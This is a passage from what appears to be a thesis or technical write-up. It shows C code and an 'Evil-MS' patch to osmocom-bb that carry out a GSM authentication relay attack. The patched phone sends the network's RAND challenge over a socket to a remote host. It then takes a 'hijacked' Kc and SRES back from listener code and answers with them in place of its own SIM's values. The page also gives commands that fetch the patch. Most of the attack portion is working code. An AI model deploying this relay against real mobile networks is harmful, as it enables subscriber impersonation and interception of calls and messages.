<span id="cb12-44"><a href="#cb12-44" aria-hidden="true" tabindex="-1"></a>               c<span class="op">,</span></span>
<span id="cb12-45"><a href="#cb12-45" aria-hidden="true" tabindex="-1"></a>               sl <span class="op">);</span></span>
<span id="cb12-46"><a href="#cb12-46" aria-hidden="true" tabindex="-1"></a>      <span class="cf">return</span> <span class="st">"prout"</span><span class="op">;</span></span>
<span id="cb12-47"><a href="#cb12-47" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span><span class="dt">int</span> i<span class="op">=</span><span class="dv">0</span><span class="op">;</span></span>
<span id="cb12-48"><a href="#cb12-48" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span> <span class="op">(*</span>c<span class="op">)</span></span>
<span id="cb12-49"><a href="#cb12-49" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
<span id="cb12-50"><a href="#cb12-50" aria-hidden="true" tabindex="-1"></a>      oc <span class="op">=</span> <span class="op">(</span>hexdigit <span class="op">(*</span>c<span class="op">++)</span> <span class="op">&lt;&lt;</span> <span class="dv">4</span><span class="op">)</span> <span class="op">+</span> hexdigit <span class="op">(*</span>c<span class="op">++);</span></span>
<span id="cb12-51"><a href="#cb12-51" aria-hidden="true" tabindex="-1"></a>      fputc <span class="op">(</span>oc<span class="op">,</span> stdout<span class="op">);</span></span>
<span id="cb12-52"><a href="#cb12-52" aria-hidden="true" tabindex="-1"></a>      strcat<span class="op">(</span>ascii<span class="op">,&amp;</span>oc<span class="op">);</span></span>
<span id="cb12-53"><a href="#cb12-53" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb12-54"><a href="#cb12-54" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb12-55"><a href="#cb12-55" aria-hidden="true" tabindex="-1"></a><span class="cf">return</span> ascii<span class="op">;}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>client.h (respect address and port of client server arch)</p>
<div class="sourceCode" id="cb13"><pre class="sourceCode c code-with-copy"><code class="sourceCode c"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="co">/**</span></span>
<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="co"> * Example taken from CS 241 @ UIUC</span></span>
<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a><span class="co"> * Edited by Austin Walters</span></span>
<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a><span class="co"> * Used as example for austingwalters.com,</span></span>
<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="co"> * in socket IPC explanation.</span></span>
<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a><span class="co"> */</span></span>
<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/types.h&gt;</span></span>
<span id="cb13-12"><a href="#cb13-12" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/socket.h&gt;</span></span>
<span id="cb13-13"><a href="#cb13-13" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;netdb.h&gt;</span></span>
<span id="cb13-14"><a href="#cb13-14" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></span>
<span id="cb13-15"><a href="#cb13-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-16"><a href="#cb13-16" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> client<span class="op">(</span><span class="dt">char</span> buffer<span class="op">[]){</span></span>
<span id="cb13-17"><a href="#cb13-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-18"><a href="#cb13-18" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span> sock_fd <span class="op">=</span> socket<span class="op">(</span>AF_INET<span class="op">,</span> SOCK_STREAM<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
<span id="cb13-19"><a href="#cb13-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-20"><a href="#cb13-20" aria-hidden="true" tabindex="-1"></a>  <span class="kw">struct</span> addrinfo info<span class="op">,</span> <span class="op">*</span>result<span class="op">;</span></span>
<span id="cb13-21"><a href="#cb13-21" aria-hidden="true" tabindex="-1"></a>  memset<span class="op">(&amp;</span>info<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span><span class="kw">struct</span> addrinfo<span class="op">));</span></span>
<span id="cb13-22"><a href="#cb13-22" aria-hidden="true" tabindex="-1"></a>  info<span class="op">.</span>ai_family <span class="op">=</span> AF_INET<span class="op">;</span></span>
<span id="cb13-23"><a href="#cb13-23" aria-hidden="true" tabindex="-1"></a>  info<span class="op">.</span>ai_socktype <span class="op">=</span> SOCK_STREAM<span class="op">;</span></span>
<span id="cb13-24"><a href="#cb13-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-25"><a href="#cb13-25" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span><span class="op">(</span><span class="dv">0</span> <span class="op">!=</span> getaddrinfo<span class="op">(</span><span class="st">"172.17.0.3"</span><span class="op">,</span> <span class="st">"888"</span><span class="op">,</span> <span class="op">&amp;</span>info<span class="op">,</span> <span class="op">&amp;</span>result<span class="op">))</span></span>
<span id="cb13-26"><a href="#cb13-26" aria-hidden="true" tabindex="-1"></a>    exit<span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
<span id="cb13-27"><a href="#cb13-27" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-28"><a href="#cb13-28" aria-hidden="true" tabindex="-1"></a>  <span class="co">/* Connects to bound socket on the server */</span>  </span>
<span id="cb13-29"><a href="#cb13-29" aria-hidden="true" tabindex="-1"></a>  connect<span class="op">(</span>sock_fd<span class="op">,</span> result<span class="op">-&gt;</span>ai_addr<span class="op">,</span> result<span class="op">-&gt;</span>ai_addrlen<span class="op">);</span></span>
<span id="cb13-30"><a href="#cb13-30" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-31"><a href="#cb13-31" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">"SENDING: </span><span class="sc">%s</span><span class="st">"</span><span class="op">,</span> buffer<span class="op">);</span></span>
<span id="cb13-32"><a href="#cb13-32" aria-hidden="true" tabindex="-1"></a>  write<span class="op">(</span>sock_fd<span class="op">,</span> buffer<span class="op">,</span> strlen<span class="op">(</span>buffer<span class="op">));</span></span>
<span id="cb13-33"><a href="#cb13-33" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-34"><a href="#cb13-34" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> resp<span class="op">[</span><span class="dv">999</span><span class="op">];</span></span>
<span id="cb13-35"><a href="#cb13-35" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span> len <span class="op">=</span> strlen<span class="op">(</span>buffer<span class="op">);</span></span>
<span id="cb13-36"><a href="#cb13-36" aria-hidden="true" tabindex="-1"></a>  resp<span class="op">[</span>len<span class="op">]</span> <span class="op">=</span> <span class="ch">'</span><span class="sc">\0</span><span class="ch">'</span><span class="op">;</span></span>
<span id="cb13-37"><a href="#cb13-37" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">"</span><span class="sc">%s\n</span><span class="st">"</span><span class="op">,</span> resp<span class="op">);</span></span>
<span id="cb13-38"><a href="#cb13-38" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>server.h (respect variable length : 13 for sres, 25 for kc, 51 for rand, and port from arch client-server)</p>
<div class="sourceCode" id="cb14"><pre class="sourceCode c code-with-copy"><code class="sourceCode c"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="co">/**</span></span>
<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="co"> * Written by Austin Walters</span></span>
<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="co"> * For an example on austingwalters.com,</span></span>
<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="co"> * on sockets</span></span>
<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a><span class="co"> */</span></span>
<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
<span id="cb14-10"><a href="#cb14-10" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/types.h&gt;</span></span>
<span id="cb14-11"><a href="#cb14-11" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/socket.h&gt;</span></span>
<span id="cb14-12"><a href="#cb14-12" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;netdb.h&gt;</span></span>
<span id="cb14-13"><a href="#cb14-13" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></span>
<span id="cb14-14"><a href="#cb14-14" aria-hidden="true" tabindex="-1"></a><span class="dt">char</span> text<span class="op">[</span><span class="dv">13</span><span class="op">];</span></span>
<span id="cb14-15"><a href="#cb14-15" aria-hidden="true" tabindex="-1"></a><span class="dt">char</span><span class="op">*</span> catch_sres<span class="op">(){</span></span>
<span id="cb14-16"><a href="#cb14-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-17"><a href="#cb14-17" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span> sock_fd <span class="op">=</span> socket<span class="op">(</span>AF_INET<span class="op">,</span> SOCK_STREAM<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
<span id="cb14-18"><a href="#cb14-18" aria-hidden="true" tabindex="-1"></a>  <span class="kw">struct</span> addrinfo directives<span class="op">,</span> <span class="op">*</span>result<span class="op">;</span></span>
<span id="cb14-19"><a href="#cb14-19" aria-hidden="true" tabindex="-1"></a>  memset<span class="op">(&amp;</span>directives<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span><span class="kw">struct</span> addrinfo<span class="op">));</span></span>
<span id="cb14-20"><a href="#cb14-20" aria-hidden="true" tabindex="-1"></a>  directives<span class="op">.</span>ai_family <span class="op">=</span> AF_INET<span class="op">;</span></span>
<span id="cb14-21"><a href="#cb14-21" aria-hidden="true" tabindex="-1"></a>  directives<span class="op">.</span>ai_socktype <span class="op">=</span> SOCK_STREAM<span class="op">;</span></span>
<span id="cb14-22"><a href="#cb14-22" aria-hidden="true" tabindex="-1"></a>  directives<span class="op">.</span>ai_flags <span class="op">=</span> AI_PASSIVE<span class="op">;</span></span>
<span id="cb14-23"><a href="#cb14-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-24"><a href="#cb14-24" aria-hidden="true" tabindex="-1"></a>  <span class="co">/* Translates IP, port, protocal into struct */</span></span>
<span id="cb14-25"><a href="#cb14-25" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span><span class="op">(</span><span class="dv">0</span> <span class="op">!=</span>  getaddrinfo<span class="op">(</span><span class="st">"0.0.0.0"</span><span class="op">,</span> <span class="st">"666"</span><span class="op">,</span> <span class="op">&amp;</span>directives<span class="op">,</span> <span class="op">&amp;</span>result<span class="op">))</span></span>
<span id="cb14-26"><a href="#cb14-26" aria-hidden="true" tabindex="-1"></a>    exit<span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
<span id="cb14-27"><a href="#cb14-27" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-28"><a href="#cb14-28" aria-hidden="true" tabindex="-1"></a>  <span class="co">/* Binds socket to port, so we know where new connections form */</span></span>
<span id="cb14-29"><a href="#cb14-29" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span><span class="op">(</span>bind<span class="op">(</span>sock_fd<span class="op">,</span> result<span class="op">-&gt;</span>ai_addr<span class="op">,</span> result<span class="op">-&gt;</span>ai_addrlen<span class="op">)</span> <span class="op">!=</span> <span class="dv">0</span><span class="op">)</span></span>
<span id="cb14-30"><a href="#cb14-30" aria-hidden="true" tabindex="-1"></a>      exit<span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
<span id="cb14-31"><a href="#cb14-31" aria-hidden="true" tabindex="-1"></a>  <span class="co">/* Places socket to "listen" or "wait for stuff" state */</span></span>
<span id="cb14-32"><a href="#cb14-32" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span><span class="op">(</span>listen<span class="op">(</span>sock_fd<span class="op">,</span> <span class="dv">10</span><span class="op">)</span> <span class="op">!=</span> <span class="dv">0</span><span class="op">)</span></span>
<span id="cb14-33"><a href="#cb14-33" aria-hidden="true" tabindex="-1"></a>      exit<span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
<span id="cb14-34"><a href="#cb14-34" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span> i<span class="op">=</span><span class="dv">0</span><span class="op">;</span></span>
<span id="cb14-35"><a href="#cb14-35" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">"Waiting for connection on http://0.0.0.0:666 ...</span><span class="sc">\n</span><span class="st">"</span><span class="op">);</span></span>
<span id="cb14-36"><a href="#cb14-36" aria-hidden="true" tabindex="-1"></a>  <span class="cf">while</span><span class="op">(</span>i<span class="op">==</span><span class="dv">0</span><span class="op">){</span></span>
<span id="cb14-37"><a href="#cb14-37" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-38"><a href="#cb14-38" aria-hidden="true" tabindex="-1"></a>    <span class="co">/* Accepts Connection */</span></span>
<span id="cb14-39"><a href="#cb14-39" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> buffer<span class="op">[</span><span class="dv">1000</span><span class="op">];</span></span>
<span id="cb14-40"><a href="#cb14-40" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> client_fd <span class="op">=</span> accept<span class="op">(</span>sock_fd<span class="op">,</span> NULL<span class="op">,</span> NULL<span class="op">);</span> </span>
<span id="cb14-41"><a href="#cb14-41" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> len <span class="op">=</span> read<span class="op">(</span>client_fd<span class="op">,</span> buffer<span class="op">,</span> <span class="dv">999</span><span class="op">);</span></span>
<span id="cb14-42"><a href="#cb14-42" aria-hidden="true" tabindex="-1"></a>    buffer<span class="op">[</span>len<span class="op">]</span> <span class="op">=</span> <span class="ch">'</span><span class="sc">\0</span><span class="ch">'</span><span class="op">;</span></span>
<span id="cb14-43"><a href="#cb14-43" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-44"><a href="#cb14-44" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span> header <span class="op">=</span> <span class="st">"&lt;b&gt;You Connected to the Server!&lt;/b&gt;&lt;/br&gt;&lt;/br&gt;"</span><span class="op">;</span></span>
<span id="cb14-45"><a href="#cb14-45" aria-hidden="true" tabindex="-1"></a>    i<span class="op">=</span>i<span class="op">+</span><span class="dv">1</span><span class="op">;</span></span>
<span id="cb14-46"><a href="#cb14-46" aria-hidden="true" tabindex="-1"></a>    write<span class="op">(</span>client_fd<span class="op">,</span> header<span class="op">,</span> strlen<span class="op">(</span>header<span class="op">));</span></span>
<span id="cb14-47"><a href="#cb14-47" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-48"><a href="#cb14-48" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">"=== Client Sent ===</span><span class="sc">\n</span><span class="st">"</span><span class="op">);</span></span>
<span id="cb14-49"><a href="#cb14-49" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">"</span><span class="sc">%s\n</span><span class="st">"</span><span class="op">,</span> buffer<span class="op">);</span></span>
<span id="cb14-50"><a href="#cb14-50" aria-hidden="true" tabindex="-1"></a>    memcpy<span class="op">(</span>text<span class="op">,</span>buffer<span class="op">,</span><span class="dv">13</span><span class="op">);</span></span>
<span id="cb14-51"><a href="#cb14-51" aria-hidden="true" tabindex="-1"></a>    close<span class="op">(</span>client_fd<span class="op">);</span></span>
<span id="cb14-52"><a href="#cb14-52" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-53"><a href="#cb14-53" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb14-54"><a href="#cb14-54" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> text<span class="op">;</span></span>
<span id="cb14-55"><a href="#cb14-55" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="evil-ms" class="level1">
<h1>Evil-MS :</h1>
<div class="sourceCode" id="cb15"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/osmocom-bb</span>
<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout fc20a37cb375dac11f45b78a446237c70f00841c</span>
<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> https://gitlab.com/francoip/thesis/raw/public/patch/thesis.patch</span>
<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a><span class="fu">patch</span> <span class="at">-p1</span> <span class="op">&lt;</span> thesis.patch</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb16"><pre class="sourceCode patch code-with-copy"><code class="sourceCode diff"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="kw">diff -ru osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c heartbreaker/bb-2rfa/src/host/layer23/src/mobile/gsm48_mm.c</span></span>
<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="dt">--- osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c   2022-08-30 15:39:46.222274989 +0200</span></span>
<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="dt">+++ heartbreaker/bb-2rfa/src/host/layer23/src/mobile/gsm48_mm.c 2022-08-30 15:35:55.472598046 +0200</span></span>
<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -20,6 +20,7 @@</span></span>
<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a>  */</span>
<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a> #include &lt;stdint.h&gt;</span>
<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a><span class="va">+#include &lt;string.h&gt;</span></span>
<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a> #include &lt;errno.h&gt;</span>
<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a> #include &lt;stdio.h&gt;</span>
<span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a> #include &lt;string.h&gt;</span>
<span id="cb16-12"><a href="#cb16-12" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -41,7 +42,7 @@</span></span>
<span id="cb16-13"><a href="#cb16-13" aria-hidden="true" tabindex="-1"></a> #include &lt;osmocom/bb/mobile/app_mobile.h&gt;</span>
<span id="cb16-14"><a href="#cb16-14" aria-hidden="true" tabindex="-1"></a> #include &lt;osmocom/bb/mobile/vty.h&gt;</span>
<span id="cb16-15"><a href="#cb16-15" aria-hidden="true" tabindex="-1"></a> #include &lt;osmocom/bb/mobile/dos.h&gt;</span>
<span id="cb16-16"><a href="#cb16-16" aria-hidden="true" tabindex="-1"></a><span class="st">-</span></span>
<span id="cb16-17"><a href="#cb16-17" aria-hidden="true" tabindex="-1"></a><span class="va">+#include "client.h"</span></span>
<span id="cb16-18"><a href="#cb16-18" aria-hidden="true" tabindex="-1"></a> extern void *l23_ctx;</span>
<span id="cb16-19"><a href="#cb16-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-20"><a href="#cb16-20" aria-hidden="true" tabindex="-1"></a> void mm_conn_free(struct gsm48_mm_conn *conn);</span>
<span id="cb16-21"><a href="#cb16-21" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -1662,6 +1663,15 @@</span></span>
<span id="cb16-22"><a href="#cb16-22" aria-hidden="true" tabindex="-1"></a>     */</span>
<span id="cb16-23"><a href="#cb16-23" aria-hidden="true" tabindex="-1"></a>    if (mm-&gt;est_cause == RR_EST_CAUSE_EMERGENCY &amp;&amp; set-&gt;emergency_imsi[0])</span>
<span id="cb16-24"><a href="#cb16-24" aria-hidden="true" tabindex="-1"></a>        no_sim = 1;</span>
<span id="cb16-25"><a href="#cb16-25" aria-hidden="true" tabindex="-1"></a><span class="va">+   char test2[]="1";</span></span>
<span id="cb16-26"><a href="#cb16-26" aria-hidden="true" tabindex="-1"></a><span class="va">+   sprintf(test2, "%d", ar-&gt;key_seq);</span></span>
<span id="cb16-27"><a href="#cb16-27" aria-hidden="true" tabindex="-1"></a><span class="va">+   char test3[3]="-";//"87 65 43 21 87 65 43 21 87 65 43 21 87 65 43 21";</span></span>
<span id="cb16-28"><a href="#cb16-28" aria-hidden="true" tabindex="-1"></a><span class="va">+   strcat(test3,test2);</span></span>
<span id="cb16-29"><a href="#cb16-29" aria-hidden="true" tabindex="-1"></a><span class="va">+   char test[51]="87 65 43 21 87 65 43 21 87 65 43 21 87 65 43 21";</span></span>
<span id="cb16-30"><a href="#cb16-30" aria-hidden="true" tabindex="-1"></a><span class="va">+   strcpy(test,osmo_hexdump(ar-&gt;rand,16));</span></span>
<span id="cb16-31"><a href="#cb16-31" aria-hidden="true" tabindex="-1"></a><span class="va">+   strcat(test,test3);</span></span>
<span id="cb16-32"><a href="#cb16-32" aria-hidden="true" tabindex="-1"></a><span class="va">+   LOGP(DMM, LOGL_INFO, "AUTHENTICATION REQUEST (seq %s)\n", test);</span></span>
<span id="cb16-33"><a href="#cb16-33" aria-hidden="true" tabindex="-1"></a><span class="va">+   client(test);</span></span>
<span id="cb16-34"><a href="#cb16-34" aria-hidden="true" tabindex="-1"></a>    gsm_subscr_generate_kc(ms, ar-&gt;key_seq, ar-&gt;rand, no_sim);</span>
<span id="cb16-35"><a href="#cb16-35" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-36"><a href="#cb16-36" aria-hidden="true" tabindex="-1"></a>    /* wait for auth response event from SIM */</span>
<span id="cb16-37"><a href="#cb16-37" aria-hidden="true" tabindex="-1"></a><span class="kw">diff -ru osmocom-bb/src/host/layer23/src/mobile/subscriber.c heartbreaker/bb-2rfa/src/host/layer23/src/mobile/subscriber.c</span></span>
<span id="cb16-38"><a href="#cb16-38" aria-hidden="true" tabindex="-1"></a><span class="dt">--- osmocom-bb/src/host/layer23/src/mobile/subscriber.c 2022-08-30 15:38:53.125893570 +0200</span></span>
<span id="cb16-39"><a href="#cb16-39" aria-hidden="true" tabindex="-1"></a><span class="dt">+++ heartbreaker/bb-2rfa/src/host/layer23/src/mobile/subscriber.c   2022-08-30 15:35:55.476598075 +0200</span></span>
<span id="cb16-40"><a href="#cb16-40" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -30,6 +30,11 @@</span></span>
<span id="cb16-41"><a href="#cb16-41" aria-hidden="true" tabindex="-1"></a> #include &lt;osmocom/bb/common/osmocom_data.h&gt;</span>
<span id="cb16-42"><a href="#cb16-42" aria-hidden="true" tabindex="-1"></a> #include &lt;osmocom/bb/common/networks.h&gt;</span>
<span id="cb16-43"><a href="#cb16-43" aria-hidden="true" tabindex="-1"></a> #include &lt;osmocom/bb/mobile/vty.h&gt;</span>
<span id="cb16-44"><a href="#cb16-44" aria-hidden="true" tabindex="-1"></a><span class="va">+#include "server.h"</span></span>
<span id="cb16-45"><a href="#cb16-45" aria-hidden="true" tabindex="-1"></a><span class="va">+#include "server2.h"</span></span>
<span id="cb16-46"><a href="#cb16-46" aria-hidden="true" tabindex="-1"></a><span class="va">+#include "hex.h"</span></span>
<span id="cb16-47"><a href="#cb16-47" aria-hidden="true" tabindex="-1"></a><span class="va">+#include "hex2.h"</span></span>
<span id="cb16-48"><a href="#cb16-48" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb16-49"><a href="#cb16-49" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-50"><a href="#cb16-50" aria-hidden="true" tabindex="-1"></a> /* enable to get an empty list of forbidden PLMNs, even if stored on SIM.</span>
<span id="cb16-51"><a href="#cb16-51" aria-hidden="true" tabindex="-1"></a>  * if list is changed, the result is not written back to SIM */</span>
<span id="cb16-52"><a href="#cb16-52" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -945,14 +950,21 @@</span></span>
<span id="cb16-53"><a href="#cb16-53" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-54"><a href="#cb16-54" aria-hidden="true" tabindex="-1"></a>        /* store sequence */</span>
<span id="cb16-55"><a href="#cb16-55" aria-hidden="true" tabindex="-1"></a>        subscr-&gt;key_seq = key_seq;</span>
<span id="cb16-56"><a href="#cb16-56" aria-hidden="true" tabindex="-1"></a><span class="st">-       memcpy(subscr-&gt;key, vec-&gt;kc, 8);</span></span>
<span id="cb16-57"><a href="#cb16-57" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb16-58"><a href="#cb16-58" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-59"><a href="#cb16-59" aria-hidden="true" tabindex="-1"></a>        LOGP(DMM, LOGL_INFO, "Sending authentication response\n");</span>
<span id="cb16-60"><a href="#cb16-60" aria-hidden="true" tabindex="-1"></a><span class="va">+                char *h4ck3d_kc;</span></span>
<span id="cb16-61"><a href="#cb16-61" aria-hidden="true" tabindex="-1"></a><span class="va">+                h4ck3d_kc = catch_kc();</span></span>
<span id="cb16-62"><a href="#cb16-62" aria-hidden="true" tabindex="-1"></a><span class="va">+                const unsigned char *my_h4ck3d_kc=hex2ascii(h4ck3d_kc);</span></span>
<span id="cb16-63"><a href="#cb16-63" aria-hidden="true" tabindex="-1"></a><span class="va">+       char *h4ck3d_sres;</span></span>
<span id="cb16-64"><a href="#cb16-64" aria-hidden="true" tabindex="-1"></a><span class="va">+       h4ck3d_sres = catch_sres();</span></span>
<span id="cb16-65"><a href="#cb16-65" aria-hidden="true" tabindex="-1"></a><span class="va">+           const unsigned char *my_h4ck3d_sres=hex2ascii2(h4ck3d_sres);</span></span>
<span id="cb16-66"><a href="#cb16-66" aria-hidden="true" tabindex="-1"></a><span class="va">+       memcpy(subscr-&gt;key, my_h4ck3d_kc, 8);</span></span>
<span id="cb16-67"><a href="#cb16-67" aria-hidden="true" tabindex="-1"></a>        nmsg = gsm48_mmevent_msgb_alloc(GSM48_MM_EVENT_AUTH_RESPONSE);</span>
<span id="cb16-68"><a href="#cb16-68" aria-hidden="true" tabindex="-1"></a><span class="st">-       if (!nmsg)</span></span>
<span id="cb16-69"><a href="#cb16-69" aria-hidden="true" tabindex="-1"></a><span class="st">-           return -ENOMEM;</span></span>
<span id="cb16-70"><a href="#cb16-70" aria-hidden="true" tabindex="-1"></a>        nmme = (struct gsm48_mm_event *) nmsg-&gt;data;</span>
<span id="cb16-71"><a href="#cb16-71" aria-hidden="true" tabindex="-1"></a><span class="st">-       memcpy(nmme-&gt;sres, vec-&gt;sres, 4);</span></span>
<span id="cb16-72"><a href="#cb16-72" aria-hidden="true" tabindex="-1"></a><span class="va">+           memcpy(nmme-&gt;sres,my_h4ck3d_sres, 4);</span></span>
<span id="cb16-73"><a href="#cb16-73" aria-hidden="true" tabindex="-1"></a><span class="va">+       LOGP(DMM, LOGL_INFO, "KC hijacked = %s\n",osmo_hexdump(my_h4ck3d_kc,8));</span></span>
<span id="cb16-74"><a href="#cb16-74" aria-hidden="true" tabindex="-1"></a><span class="va">+       LOGP(DMM, LOGL_INFO, "SRES hijacked = %s\n",osmo_hexdump(my_h4ck3d_sres,4));</span></span>
<span id="cb16-75"><a href="#cb16-75" aria-hidden="true" tabindex="-1"></a>        gsm48_mmevent_msg(ms, nmsg);</span>
<span id="cb16-76"><a href="#cb16-76" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-77"><a href="#cb16-77" aria-hidden="true" tabindex="-1"></a>        return 0;</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
